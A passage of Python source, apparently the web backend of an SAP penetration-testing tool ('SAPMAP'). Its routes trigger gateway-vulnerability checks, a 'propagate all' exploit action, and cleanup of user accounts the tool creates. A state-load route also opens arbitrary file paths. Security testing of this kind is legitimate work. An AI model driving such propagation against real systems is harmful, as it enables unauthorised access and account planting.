        ip = (data.get("ip") or "").strip()
        inst_nr = (data.get("instance_nr") or "").strip()

        if not sid or len(sid) != 3 or not sid.isalnum():
            return json.dumps({"error": "SID must be exactly 3 alphanumeric characters"})
        if not ip:
            return json.dumps({"error": "IP/Hostname is required"})
        if not inst_nr or len(inst_nr) != 2 or not inst_nr.isdigit():
            return json.dumps({"error": "Instance number must be 2 digits (00-99)"})
        if api.state.get_node(sid):
            return json.dumps({"error": f"System {sid} already exists on the map"})

        saprouter = (data.get("saprouter") or "").strip()

        nr = inst_nr
        # Only set dispatcher/gateway ports (derived from instance nr)
        # — other ports are discovered by scanning
        ports = {
            int(f"32{nr}"): "dispatcher",
            int(f"33{nr}"): "gateway",
        }
        instance = InstanceInfo(instance_nr=nr, ip=ip, ports=ports)
        node = SAPNode(sid=sid, ip=ip, hostname=ip, instances=[instance],
                       saprouter=saprouter)
        api.state.add_node(node)
        router_msg = f", via SAProuter" if saprouter else ""
        print(f"[+] Manually added system {sid} ({ip}, instance {nr}{router_msg})")
        return json.dumps({"status": "ok"})

    # -- Default password --
    @app.route("/api/settings/password", method="GET")
    def get_password():
        response.content_type = "application/json"
        import sapmap_config
        return json.dumps({"password": sapmap_config.SAPMAP_PASSWORD})

    @app.route("/api/settings/password", method="POST")
    def set_password():
        response.content_type = "application/json"
        data = request.json or {}
        new_pwd = (data.get("password") or "").strip()
        if not new_pwd:
            return json.dumps({"error": "Password cannot be empty"})
        import sapmap_config
        sapmap_config.SAPMAP_PASSWORD = new_pwd
        # Also update legacy aliases for any code that still imports them
        sapmap_config.SAPMAP_PASSWORD_ABAP = new_pwd
        sapmap_config.SAPMAP_PASSWORD_BAPI = new_pwd
        print(f"[*] Default password changed to: {new_pwd[:3]}{'*' * (len(new_pwd)-3)}")
        return json.dumps({"status": "ok"})

    # -- Exit --
    @app.route("/api/exit", method="POST")
    def do_exit():
        response.content_type = "application/json"
        print("[*] Exit requested — shutting down ...")
        import threading
        threading.Timer(0.5, lambda: os._exit(0)).start()
        return json.dumps({"status": "ok"})

    # -- Global actions --
    @app.route("/api/actions/propagate_all", method="POST")
    def actions_propagate_all():
        response.content_type = "application/json"

        def _run():
            sapmap_exploit.propagate_all(api.state)

        _bg("_propagate_all", "Propagate All", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/actions/cleanup_all", method="POST")
    def actions_cleanup_all():
        response.content_type = "application/json"

        def _run():
            sapmap_cleanup.cleanup_all_users(api.state)

        _bg("_cleanup_all", "Cleanup All", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/actions/check_all_gw", method="POST")
    def actions_check_all_gw():
        response.content_type = "application/json"
        nodes = list(api.state.nodes.values())
        if len(nodes) < 2:
            return json.dumps({"error": "Need at least 2 systems on the map"})

        def _run():
            for node in nodes:
                print(f"[*] Checking GW vulnerability: {node.sid} ({node.ip})")
                sapmap_exploit.check_gw_vulnerable(node)

        _bg("_check_all_gw", "Check All GW Vulnerabilities", _run)
        return json.dumps({"status": "started", "systems": len(nodes)})

    @app.route("/api/actions/reset_rfc_cache", method="POST")
    def actions_reset_rfc_cache():
        response.content_type = "application/json"
        state_mgr.reset_rfc_cache(api.state)
        return json.dumps({"status": "ok"})

    @app.route("/api/actions/rfc_check_list")
    def actions_rfc_check_list():
        response.content_type = "application/json"
        cache = api.state.rfc_check_cache
        entries = []
        for dest, result in cache.items():
            entries.append({
                "destination": dest,
                "logon_ok": result.get("logon_ok", False),
                "ping_ok": result.get("ping_ok", False),
                "latency_ms": result.get("latency_ms", 0),
                "error": result.get("error", ""),
            })
        return json.dumps({"entries": entries})

    @app.route("/api/actions/created_users")
    def actions_created_users():
        response.content_type = "application/json"
        users = sapmap_cleanup.list_created_users(api.state)
        return json.dumps({"users": users})

    @app.route("/api/actions/created_destinations")
    def actions_created_destinations():
        response.content_type = "application/json"
        return json.dumps({"destinations": api.state.created_destinations})

    @app.route("/api/actions/clear_created_destinations", method="POST")
    def actions_clear_created_destinations():
        response.content_type = "application/json"
        state_mgr.clear_created_destinations(api.state)
        return json.dumps({"status": "ok"})

    # -- State save/load --
    @app.route("/api/state/save", method="POST")
    def api_state_save():
        response.content_type = "application/json"
        data = request.json or {}
        name = data.get("name", "")
        if not name:
            filepath = state_mgr.auto_save_path()
        else:
            filepath = os.path.join(state_mgr.STATE_DIR, name)
        try:
            state_mgr.save_state(api.state, filepath)
            return json.dumps({"status": "ok", "path": filepath})
        except Exception as e:
            return json.dumps({"error": str(e)})

    @app.route("/api/state/load", method="POST")
    def api_state_load():
        response.content_type = "application/json"
        data = request.json or {}
        name = data.get("name", "")
        if not name:
            return json.dumps({"error": "No file specified"})

        # Try as absolute path, then relative to states dir
        filepath = name
        if not os.path.isabs(filepath):
            filepath = os.path.join(state_mgr.STATE_DIR, name)
        if not filepath.endswith(".sapmap") and not filepath.endswith(".json"):
            filepath += ".sapmap"

        try:
            api.state = state_mgr.load_state(filepath)
            return json.dumps({"status": "ok"})
        except Exception as e:
            return json.dumps({"error": str(e)})

    @app.route("/api/state/upload", method="POST")
    def api_state_upload():
        """Load state from an uploaded file (browser file picker)."""
        response.content_type = "application/json"
        try:
            data = request.json
            if not data:
                return json.dumps({"error": "No data received"})
            api.state = SAPMAPState.from_dict(data)
            return json.dumps({"status": "ok"})
        except Exception as e:
            return json.dumps({"error": str(e)})

    # -- Export --
    @app.route("/api/export/json")
    def export_json():
        response.content_type = "application/json"
        response.headers["Content-Disposition"] = (
            f'attachment; filename="sapmap_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json"'
        )
        return api.state.to_json(indent=2)

    return app
